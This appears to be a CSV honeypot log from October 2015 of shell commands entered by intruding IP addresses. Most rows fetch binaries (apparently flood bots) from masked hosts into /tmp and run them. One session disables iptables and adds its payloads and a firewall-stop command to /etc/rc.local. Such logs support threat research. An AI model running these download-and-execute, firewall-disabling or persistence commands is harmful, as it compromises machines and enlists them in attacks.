ip,timestamp,input
"222.186.34.75","2015-10-16 22:14:58","exit"
"222.186.34.75","2015-10-16 22:34:02","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-16 22:34:06","cd /tmp"
"222.186.34.75","2015-10-16 22:34:10","chmod 777 ./ssd"
"222.186.34.75","2015-10-16 22:34:14","./ssd"
"222.186.34.75","2015-10-16 22:34:18","exit"
"222.186.34.75","2015-10-16 22:42:08","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-16 22:42:40","cd /tmp"
"222.186.34.75","2015-10-16 22:42:40","chmod 777 ./ssd"
"222.186.34.75","2015-10-16 22:42:40","./ssd"
"222.186.34.75","2015-10-16 22:42:40","exit"
"222.186.34.75","2015-10-16 22:42:40","wget -O /tmp/25000-udp http://***.***.***.***/25000-udp"
"222.186.34.75","2015-10-16 22:42:44","cd /tmp"
"222.186.34.75","2015-10-16 22:42:48","chmod 777 ./25000-udp"
"222.186.34.75","2015-10-16 22:42:52","./25000-udp"
"222.186.34.75","2015-10-16 22:42:56","exit"
"222.186.34.75","2015-10-16 22:47:04","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-16 22:47:08","cd /tmp"
"222.186.34.75","2015-10-16 22:47:12","chmod 777 ./ssd"
"222.186.34.75","2015-10-16 22:47:16","./ssd"
"222.186.34.75","2015-10-16 22:47:20","exit"
"222.186.34.75","2015-10-16 22:52:08","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-16 22:52:11","cd /tmp"
"222.186.34.75","2015-10-16 22:52:15","chmod 777 ./ssd"
"222.186.34.75","2015-10-16 22:52:19","./ssd"
"222.186.34.75","2015-10-16 22:52:23","exit"
"222.186.34.75","2015-10-16 23:05:59","wget -O /tmp/25000-udp http://***.***.***.***/25000-udp"
"222.186.34.75","2015-10-16 23:06:03","cd /tmp"
"222.186.34.75","2015-10-16 23:06:07","chmod 777 ./25000-udp"
"222.186.34.75","2015-10-16 23:06:11","./25000-udp"
"222.186.34.75","2015-10-16 23:06:15","exit"
"222.186.34.75","2015-10-16 23:17:17","wget -O /tmp/25000-syn http://***.***.***.***/25000-syn"
"222.186.34.75","2015-10-16 23:17:21","cd /tmp"
"222.186.34.75","2015-10-16 23:17:25","chmod 777 ./25000-syn"
"222.186.34.75","2015-10-16 23:17:29","./25000-syn"
"222.186.34.75","2015-10-16 23:17:33","exit"
"222.186.34.75","2015-10-16 23:24:24","wget -O /tmp/25000-udp http://***.***.***.***/25000-udp"
"222.186.34.75","2015-10-16 23:24:27","cd /tmp"
"222.186.34.75","2015-10-16 23:24:31","chmod 777 ./25000-udp"
"222.186.34.75","2015-10-16 23:24:35","./25000-udp"
"222.186.34.75","2015-10-16 23:24:39","exit"
"222.186.34.75","2015-10-16 23:27:10","wget -O /tmp/25000-udp http://***.***.***.***/25000-udp"
"222.186.34.75","2015-10-16 23:27:13","cd /tmp"
"222.186.34.75","2015-10-16 23:27:17","chmod 777 ./25000-udp"
"222.186.34.75","2015-10-16 23:27:21","./25000-udp"
"222.186.34.75","2015-10-16 23:27:25","exit"
"222.186.34.75","2015-10-16 23:28:46","wget -O /tmp/25000-udp http://***.***.***.***/25000-udp"
"222.186.34.75","2015-10-16 23:28:50","cd /tmp"
"222.186.34.75","2015-10-16 23:28:54","chmod 777 ./25000-udp"
"222.186.34.75","2015-10-16 23:29:12","./25000-udp"
"222.186.34.75","2015-10-16 23:29:12","exit"
"222.186.34.75","2015-10-16 23:29:13","wget -O /tmp/25000-udp http://***.***.***.***/25000-udp"
"222.186.34.75","2015-10-16 23:29:16","cd /tmp"
"222.186.34.75","2015-10-16 23:29:20","chmod 777 ./25000-udp"
"222.186.34.75","2015-10-16 23:29:24","./25000-udp"
"222.186.34.75","2015-10-16 23:29:28","exit"
"222.186.34.75","2015-10-16 23:31:26","wget -O /tmp/25000-syn http://***.***.***.***/25000-syn"
"222.186.34.75","2015-10-16 23:31:29","cd /tmp"
"222.186.34.75","2015-10-16 23:31:33","chmod 777 ./25000-syn"
"222.186.34.75","2015-10-16 23:31:37","./25000-syn"
"222.186.34.75","2015-10-16 23:31:41","exit"
"222.186.34.75","2015-10-16 23:48:41","wget -O /tmp/25000-syn http://***.***.***.***/25000-syn"
"222.186.34.75","2015-10-16 23:48:45","cd /tmp"
"222.186.34.75","2015-10-16 23:48:49","chmod 777 ./25000-syn"
"222.186.34.75","2015-10-16 23:48:53","./25000-syn"
"222.186.34.75","2015-10-16 23:48:57","exit"
"116.8.240.13","2015-10-17 00:31:51","/etc/init.d/iptables stop"
"116.8.240.13","2015-10-17 00:31:51","service iptables stop"
"116.8.240.13","2015-10-17 00:31:51","SuSEfirewall2 stop"
"116.8.240.13","2015-10-17 00:31:51","reSuSEfirewall2 stop"
"116.8.240.13","2015-10-17 00:31:52","wget -c http://***.***.***.***/swyord"
"116.8.240.13","2015-10-17 00:31:52","chmod 777 swyord"
"116.8.240.13","2015-10-17 00:31:52","./swyord"
"116.8.240.13","2015-10-17 00:36:36","service iptables stop"
"116.8.240.13","2015-10-17 00:37:09","wget http://***.***.***.***/1032"
"116.8.240.13","2015-10-17 00:37:09","chmod 0755 /root/1032"
"116.8.240.13","2015-10-17 00:37:10","nohup /root/1032 > /dev/null 2>&1 &"
"116.8.240.13","2015-10-17 00:37:10","chmod 777 1032"
"116.8.240.13","2015-10-17 00:37:10","./1032"
"116.8.240.13","2015-10-17 00:37:10","chmod 0755 /root/1032"
"116.8.240.13","2015-10-17 00:37:11","nohup /root/1032 &gt"
"116.8.240.13","2015-10-17 00:37:11","/dev/null 2&gt"
"116.8.240.13","2015-10-17 00:37:11","&amp"
"116.8.240.13","2015-10-17 00:37:11","1 &amp"
"116.8.240.13","2015-10-17 00:37:11","chmod 0777 1032"
"116.8.240.13","2015-10-17 00:37:12","chmod u+x 1032"
"116.8.240.13","2015-10-17 00:37:16","./1032 &"
"116.8.240.13","2015-10-17 00:37:20","chmod u+x 1032"
"116.8.240.13","2015-10-17 00:37:24","./1032 &"
"116.8.240.13","2015-10-17 00:37:28","cd /tmp"
"116.8.240.13","2015-10-17 00:37:32","service iptables stop"
"116.8.240.13","2015-10-17 00:37:36","wget http://***.***.***.***/1064"
"116.8.240.13","2015-10-17 00:37:40","chmod 0755 /root/1064"
"116.8.240.13","2015-10-17 00:37:44","nohup /root/1064 > /dev/null 2>&1 &"
"116.8.240.13","2015-10-17 00:37:48","chmod 777 1064"
"116.8.240.13","2015-10-17 00:37:52","./1064"
"116.8.240.13","2015-10-17 00:37:56","chmod 0755 /root/1064"
"116.8.240.13","2015-10-17 00:38:00","nohup /root/1064 &gt"
"116.8.240.13","2015-10-17 00:38:00","/dev/null 2&gt"
"116.8.240.13","2015-10-17 00:38:00","&amp"
"116.8.240.13","2015-10-17 00:38:00","1 &amp"
"116.8.240.13","2015-10-17 00:38:04","chmod 0777 1064"
"116.8.240.13","2015-10-17 00:38:08","chmod u+x 1064"
"116.8.240.13","2015-10-17 00:38:12","./1064 &"
"116.8.240.13","2015-10-17 00:38:16","chmod u+x 1064"
"116.8.240.13","2015-10-17 00:38:20","./1064 &"
"116.8.240.13","2015-10-17 00:38:24","cd /tmp"
"116.8.240.13","2015-10-17 00:38:28","echo \"cd  /root/\">>/etc/rc.local"
"116.8.240.13","2015-10-17 00:38:32","echo \"./1032&\">>/etc/rc.local"
"116.8.240.13","2015-10-17 00:38:36","echo \"./1064&\">>/etc/rc.local"
"116.8.240.13","2015-10-17 00:38:40","echo \"/etc/init.d/iptables stop\">>/etc/rc.local"
"222.186.34.75","2015-10-17 02:28:59","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-17 02:29:03","cd /tmp"
"222.186.34.75","2015-10-17 02:29:07","chmod 777 ./ssd"
"222.186.34.75","2015-10-17 02:29:11","./ssd"
"222.186.34.75","2015-10-17 02:29:15","exit"
"222.186.34.75","2015-10-17 02:48:45","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-17 02:48:49","cd /tmp"
"222.186.34.75","2015-10-17 02:48:53","chmod 777 ./ssd"
"222.186.34.75","2015-10-17 02:48:57","./ssd"
"222.186.34.75","2015-10-17 02:49:01","exit"
"222.186.34.75","2015-10-17 02:56:36","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-17 02:56:40","cd /tmp"
"222.186.34.75","2015-10-17 02:56:44","chmod 777 ./ssd"
"222.186.34.75","2015-10-17 02:56:48","./ssd"
"222.186.34.75","2015-10-17 02:56:52","exit"
"222.186.34.75","2015-10-17 12:12:36","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-17 12:12:40","cd /tmp"
"222.186.34.75","2015-10-17 12:12:44","chmod 777 ./ssd"
"222.186.34.75","2015-10-17 12:12:48","./ssd"
"222.186.34.75","2015-10-17 12:12:52","exit"
"222.186.34.75","2015-10-17 12:32:46","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-17 12:32:50","cd /tmp"
"222.186.34.75","2015-10-17 12:32:54","chmod 777 ./ssd"
"222.186.34.75","2015-10-17 12:32:58","./ssd"
"222.186.34.75","2015-10-17 12:33:02","exit"
"222.186.34.75","2015-10-17 13:16:58","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-17 13:17:02","cd /tmp"
"222.186.34.75","2015-10-17 13:17:06","chmod 777 ./ssd"
"222.186.34.75","2015-10-17 13:17:10","./ssd"
"222.186.34.75","2015-10-17 13:17:14","exit"
"222.186.34.75","2015-10-17 13:19:58","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-17 13:20:02","cd /tmp"
"222.186.34.75","2015-10-17 13:20:06","chmod 777 ./ssd"
"222.186.34.75","2015-10-17 13:20:10","./ssd"
"222.186.34.75","2015-10-17 13:20:14","exit"
"222.186.34.75","2015-10-17 13:28:45","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-17 13:28:49","cd /tmp"
"222.186.34.75","2015-10-17 13:28:53","chmod 777 ./ssd"
"222.186.34.75","2015-10-17 13:28:57","./ssd"
"222.186.34.75","2015-10-17 13:29:01","exit"
"176.101.237.163","2015-10-17 18:28:32","echo -n test"
"176.101.237.163","2015-10-17 18:31:46","echo -n test"
"222.186.34.75","2015-10-17 19:42:07","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-17 19:42:11","cd /tmp"
"222.186.34.75","2015-10-17 19:42:15","chmod 777 ./ssd"
"222.186.34.75","2015-10-17 19:42:19","./ssd"
"222.186.34.75","2015-10-17 19:42:23","exit"
"222.186.34.75","2015-10-17 19:54:28","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-17 19:54:32","cd /tmp"
"222.186.34.75","2015-10-17 19:54:36","chmod 777 ./ssd"
"222.186.34.75","2015-10-17 19:54:40","./ssd"
"222.186.34.75","2015-10-17 19:54:44","exit"
"222.186.34.75","2015-10-17 20:02:30","wget -O /tmp/25000-syn http://***.***.***.***/25000-syn"
"222.186.34.75","2015-10-17 20:02:33","cd /tmp"
"222.186.34.75","2015-10-17 20:02:38","chmod 777 ./25000-syn"
"222.186.34.75","2015-10-17 20:02:41","./25000-syn"
"222.186.34.75","2015-10-17 20:02:45","exit"
"222.186.34.75","2015-10-17 20:07:12","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-17 20:07:16","cd /tmp"
"222.186.34.75","2015-10-17 20:07:20","chmod 777 ./ssd"
"222.186.34.75","2015-10-17 20:07:24","./ssd"
"222.186.34.75","2015-10-17 20:07:28","exit"
"222.186.34.75","2015-10-17 20:13:36","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-17 20:13:40","cd /tmp"
"222.186.34.75","2015-10-17 20:13:44","chmod 777 ./ssd"
"222.186.34.75","2015-10-17 20:13:48","./ssd"
"222.186.34.75","2015-10-17 20:13:52","exit"
"222.186.34.75","2015-10-17 20:22:07","wget -O /tmp/25000-syn http://***.***.***.***/25000-syn"
"222.186.34.75","2015-10-17 20:22:11","cd /tmp"
"222.186.34.75","2015-10-17 20:22:15","chmod 777 ./25000-syn"
"222.186.34.75","2015-10-17 20:22:19","./25000-syn"
"222.186.34.75","2015-10-17 20:22:23","exit"
"222.186.34.75","2015-10-17 20:23:44","wget -O /tmp/25000-syn http://***.***.***.***/25000-syn"
"222.186.34.75","2015-10-17 20:23:48","cd /tmp"
"222.186.34.75","2015-10-17 20:23:52","chmod 777 ./25000-syn"
"222.186.34.75","2015-10-17 20:23:56","./25000-syn"
"222.186.34.75","2015-10-17 20:24:00","exit"
"222.186.34.75","2015-10-17 20:24:45","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-17 20:24:49","cd /tmp"
"222.186.34.75","2015-10-17 20:24:53","chmod 777 ./ssd"
"222.186.34.75","2015-10-17 20:24:57","./ssd"
"222.186.34.75","2015-10-17 20:25:01","exit"
"222.186.34.75","2015-10-17 20:37:32","wget -O /tmp/25000-syn http://***.***.***.***/25000-syn"
"222.186.34.75","2015-10-17 20:37:36","cd /tmp"
"222.186.34.75","2015-10-17 20:37:40","chmod 777 ./25000-syn"
"222.186.34.75","2015-10-17 20:37:44","./25000-syn"
"222.186.34.75","2015-10-17 20:37:48","exit"
"222.186.34.75","2015-10-17 20:38:32","wget -O /tmp/25000-syn http://***.***.***.***/25000-syn"
"222.186.34.75","2015-10-17 20:38:36","cd /tmp"
"222.186.34.75","2015-10-17 20:38:40","chmod 777 ./25000-syn"
"222.186.34.75","2015-10-17 20:38:44","./25000-syn"
"222.186.34.75","2015-10-17 20:38:48","exit"
"177.126.158.170","2015-10-18 05:20:47","echo -n test"
"177.126.158.170","2015-10-18 05:24:13","echo -n test"
"190.122.28.121","2015-10-18 08:48:19","echo -n test"
"190.122.28.121","2015-10-18 08:51:27","echo -n test"
"131.0.113.38","2015-10-18 13:21:54","echo -n test"
"131.0.113.38","2015-10-18 13:25:34","echo -n test"
"103.239.233.167","2015-10-18 14:02:11","echo -n test"
"103.239.233.167","2015-10-18 14:05:38","echo -n test"
"103.224.54.2","2015-10-18 16:28:09","echo -n test"
"103.224.54.2","2015-10-18 16:32:03","echo -n test"
"177.67.107.217","2015-10-18 18:54:12","echo -n test"
"177.67.107.217","2015-10-18 18:57:48","echo -n test"
"222.186.34.75","2015-10-18 22:48:55","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-18 22:48:59","cd /tmp"
"222.186.34.75","2015-10-18 22:49:03","chmod 777 ./ssd"
"222.186.34.75","2015-10-18 22:49:07","./ssd"
"222.186.34.75","2015-10-18 22:49:11","exit"
"222.186.34.75","2015-10-18 22:52:29","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-18 22:52:33","cd /tmp"
"222.186.34.75","2015-10-18 22:52:37","chmod 777 ./ssd"
"222.186.34.75","2015-10-18 22:52:41","./ssd"
"222.186.34.75","2015-10-18 22:52:45","exit"
"222.186.34.75","2015-10-18 22:53:22","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-18 22:53:26","cd /tmp"
"222.186.34.75","2015-10-18 22:53:30","chmod 777 ./ssd"
"222.186.34.75","2015-10-18 22:53:34","./ssd"
"222.186.34.75","2015-10-18 22:53:38","exit"
"222.186.34.75","2015-10-18 22:54:07","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-18 22:54:11","cd /tmp"
"222.186.34.75","2015-10-18 22:54:15","chmod 777 ./ssd"
"222.186.34.75","2015-10-18 22:54:19","./ssd"
"222.186.34.75","2015-10-18 22:54:23","exit"
"222.186.34.75","2015-10-18 23:26:16","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-18 23:26:20","cd /tmp"
"222.186.34.75","2015-10-18 23:26:24","chmod 777 ./ssd"
"222.186.34.75","2015-10-18 23:26:28","./ssd"
"222.186.34.75","2015-10-18 23:26:32","exit"
"222.186.34.75","2015-10-18 23:34:26","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-18 23:34:30","cd /tmp"
"222.186.34.75","2015-10-18 23:34:34","chmod 777 ./ssd"
"222.186.34.75","2015-10-18 23:34:38","./ssd"
"222.186.34.75","2015-10-18 23:34:42","exit"
"222.186.34.75","2015-10-19 02:37:14","wget -O /tmp/25000-syn http://***.***.***.***/25000-syn"
"222.186.34.75","2015-10-19 02:37:18","cd /tmp"
"222.186.34.75","2015-10-19 02:37:22","chmod 777 ./25000-syn"
"222.186.34.75","2015-10-19 02:37:26","./25000-syn"
"222.186.34.75","2015-10-19 02:37:30","exit"
"222.186.34.75","2015-10-19 02:39:29","wget -O /tmp/25000-syn http://***.***.***.***/25000-syn"
"222.186.34.75","2015-10-19 02:39:33","cd /tmp"
"222.186.34.75","2015-10-19 02:39:37","chmod 777 ./25000-syn"
"222.186.34.75","2015-10-19 02:39:41","./25000-syn"
"222.186.34.75","2015-10-19 02:39:45","exit"
"222.186.34.75","2015-10-19 02:41:12","wget -O /tmp/25000-syn http://***.***.***.***/25000-syn"
"222.186.34.75","2015-10-19 02:41:16","cd /tmp"
"222.186.34.75","2015-10-19 02:41:20","chmod 777 ./25000-syn"
"222.186.34.75","2015-10-19 02:41:24","./25000-syn"
"222.186.34.75","2015-10-19 02:41:28","exit"
"222.186.34.75","2015-10-19 03:03:44","wget -O /tmp/25000-syn http://***.***.***.***/25000-syn"
"222.186.34.75","2015-10-19 03:03:48","cd /tmp"
"222.186.34.75","2015-10-19 03:03:52","chmod 777 ./25000-syn"
"222.186.34.75","2015-10-19 03:03:56","./25000-syn"
"222.186.34.75","2015-10-19 03:03:59","exit"
"222.186.34.75","2015-10-19 03:24:31","wget -O /tmp/25000-syn http://***.***.***.***/25000-syn"
"222.186.34.75","2015-10-19 03:24:35","cd /tmp"
"222.186.34.75","2015-10-19 03:24:39","chmod 777 ./25000-syn"
"222.186.34.75","2015-10-19 03:24:43","./25000-syn"
"222.186.34.75","2015-10-19 03:24:47","exit"
"24.19.220.50","2015-10-19 06:37:23","echo -n test"
"24.19.220.50","2015-10-19 06:40:35","echo -n test"
"222.186.34.75","2015-10-19 09:10:56","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 09:10:59","cd /tmp"
"222.186.34.75","2015-10-19 09:11:03","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 09:11:07","./ssd"
"222.186.34.75","2015-10-19 09:11:11","exit"
"222.186.34.75","2015-10-19 09:12:48","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 09:12:52","cd /tmp"
"222.186.34.75","2015-10-19 09:12:56","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 09:13:00","./ssd"
"222.186.34.75","2015-10-19 09:13:04","exit"
"222.186.34.75","2015-10-19 09:15:01","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 09:15:04","cd /tmp"
"222.186.34.75","2015-10-19 09:15:08","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 09:15:12","./ssd"
"222.186.34.75","2015-10-19 09:15:16","exit"
"222.186.34.75","2015-10-19 09:23:26","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 09:23:30","cd /tmp"
"222.186.34.75","2015-10-19 09:23:34","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 09:23:38","./ssd"
"222.186.34.75","2015-10-19 09:23:42","exit"
"222.186.34.75","2015-10-19 09:29:58","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 09:30:02","cd /tmp"
"222.186.34.75","2015-10-19 09:30:06","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 09:30:10","./ssd"
"222.186.34.75","2015-10-19 09:30:14","exit"
"222.186.34.75","2015-10-19 09:47:04","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 09:47:07","cd /tmp"
"222.186.34.75","2015-10-19 09:47:12","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 09:47:15","./ssd"
"222.186.34.75","2015-10-19 09:47:19","exit"
"222.186.34.75","2015-10-19 09:59:56","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 09:59:59","cd /tmp"
"222.186.34.75","2015-10-19 10:00:04","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 10:00:07","./ssd"
"222.186.34.75","2015-10-19 10:00:11","exit"
"222.186.34.75","2015-10-19 10:42:07","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 10:42:11","cd /tmp"
"222.186.34.75","2015-10-19 10:42:15","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 10:42:19","./ssd"
"222.186.34.75","2015-10-19 10:42:23","exit"
"216.251.201.64","2015-10-19 17:08:56","echo -n test"
"216.251.201.64","2015-10-19 17:12:08","echo -n test"
"222.186.34.75","2015-10-19 17:38:41","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 17:38:45","cd /tmp"
"222.186.34.75","2015-10-19 17:38:49","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 17:38:53","./ssd"
"222.186.34.75","2015-10-19 17:38:57","exit"
"222.186.34.75","2015-10-19 17:44:28","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 17:44:38","cd /tmp"
"222.186.34.75","2015-10-19 17:44:48","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 17:44:58","./ssd"
"222.186.34.75","2015-10-19 17:45:08","exit"
"222.186.34.75","2015-10-19 17:52:09","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 17:52:12","cd /tmp"
"222.186.34.75","2015-10-19 17:52:16","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 17:52:20","./ssd"
"222.186.34.75","2015-10-19 17:52:24","exit"
"222.186.34.75","2015-10-19 18:01:36","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 18:01:40","cd /tmp"
"222.186.34.75","2015-10-19 18:01:44","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 18:01:48","./ssd"
"222.186.34.75","2015-10-19 18:01:52","exit"
"222.186.34.75","2015-10-19 18:03:00","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 18:03:05","cd /tmp"
"222.186.34.75","2015-10-19 18:03:08","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 18:03:12","./ssd"
"222.186.34.75","2015-10-19 18:03:16","exit"
"222.186.34.75","2015-10-19 18:38:09","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 18:38:13","cd /tmp"
"222.186.34.75","2015-10-19 18:38:17","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 18:38:21","./ssd"
"222.186.34.75","2015-10-19 18:38:25","exit"
"222.186.34.75","2015-10-19 18:39:26","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 18:39:30","cd /tmp"
"222.186.34.75","2015-10-19 18:39:34","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 18:39:38","./ssd"
"222.186.34.75","2015-10-19 18:39:42","exit"
"222.186.34.75","2015-10-19 18:43:57","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 18:44:01","cd /tmp"
"222.186.34.75","2015-10-19 18:44:05","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 18:44:09","./ssd"
"222.186.34.75","2015-10-19 18:44:13","exit"
"222.186.34.75","2015-10-19 18:49:16","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 18:49:20","cd /tmp"
"222.186.34.75","2015-10-19 18:49:24","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 18:49:28","./ssd"
"222.186.34.75","2015-10-19 18:49:32","exit"
"222.186.34.75","2015-10-19 19:17:36","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-19 19:17:40","cd /tmp"
"222.186.34.75","2015-10-19 19:17:44","chmod 777 ./ssd"
"222.186.34.75","2015-10-19 19:17:48","./ssd"
"222.186.34.75","2015-10-19 19:17:52","exit"
"222.186.34.75","2015-10-20 03:02:56","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-20 03:03:00","cd /tmp"
"222.186.34.75","2015-10-20 03:03:04","chmod 777 ./ssd"
"222.186.34.75","2015-10-20 03:03:08","./ssd"
"222.186.34.75","2015-10-20 03:03:12","exit"
"115.144.166.31","2015-10-20 03:51:24","wget -O /tmp/ssd http://***.***.***.***/ssd"
"115.144.166.31","2015-10-20 03:51:28","cd /tmp"
"115.144.166.31","2015-10-20 03:51:32","chmod 0775 ./ssd"
"115.144.166.31","2015-10-20 03:51:36","./ssd"
"115.144.166.31","2015-10-20 03:58:30","wget -O /tmp/ssd http://***.***.***.***/ssd"
"115.144.166.31","2015-10-20 03:58:34","cd /tmp"
"115.144.166.31","2015-10-20 03:58:38","chmod 0775 ./ssd"
"115.144.166.31","2015-10-20 03:58:42","./ssd"
"115.144.166.31","2015-10-20 03:58:50","wget -O /tmp/ssd http://***.***.***.***/ssd"
"115.144.166.31","2015-10-20 03:58:54","cd /tmp"
"115.144.166.31","2015-10-20 03:58:58","chmod 777 ./ssd"
"115.144.166.31","2015-10-20 03:59:02","./ssd"
"115.144.166.31","2015-10-20 03:59:21","exit"
"115.144.166.31","2015-10-20 03:59:21","wget -O /tmp/ssd http://***.***.***.***/ssd"
"115.144.166.31","2015-10-20 03:59:25","cd /tmp"
"115.144.166.31","2015-10-20 03:59:29","chmod 0775 ./ssd"
"115.144.166.31","2015-10-20 03:59:33","./ssd"
"115.144.166.31","2015-10-20 03:59:41","wget -O /tmp/ssd http://***.***.***.***/ssd"
"115.144.166.31","2015-10-20 03:59:45","cd /tmp"
"115.144.166.31","2015-10-20 03:59:49","chmod 777 ./ssd"
"115.144.166.31","2015-10-20 03:59:53","./ssd"
"115.144.166.31","2015-10-20 03:59:57","exit"
"222.186.34.75","2015-10-20 04:14:57","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-20 04:15:01","cd /tmp"
"222.186.34.75","2015-10-20 04:15:05","chmod 777 ./ssd"
"222.186.34.75","2015-10-20 04:15:09","./ssd"
"222.186.34.75","2015-10-20 04:15:13","exit"
"222.186.34.75","2015-10-20 04:54:04","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-20 04:54:08","cd /tmp"
"222.186.34.75","2015-10-20 04:54:12","chmod 777 ./ssd"
"222.186.34.75","2015-10-20 04:54:16","./ssd"
"222.186.34.75","2015-10-20 04:54:20","exit"
"222.186.34.75","2015-10-20 05:02:58","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-20 05:03:02","cd /tmp"
"222.186.34.75","2015-10-20 05:03:06","chmod 777 ./ssd"
"222.186.34.75","2015-10-20 05:03:10","./ssd"
"222.186.34.75","2015-10-20 05:03:14","exit"
"177.22.106.208","2015-10-20 15:16:40","echo -n test"
"177.22.106.208","2015-10-20 15:19:51","echo -n test"
"222.186.34.75","2015-10-20 22:56:12","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-20 22:56:16","cd /tmp"
"222.186.34.75","2015-10-20 22:56:20","chmod 777 ./ssd"
"222.186.34.75","2015-10-20 22:56:24","./ssd"
"222.186.34.75","2015-10-20 22:56:28","exit"
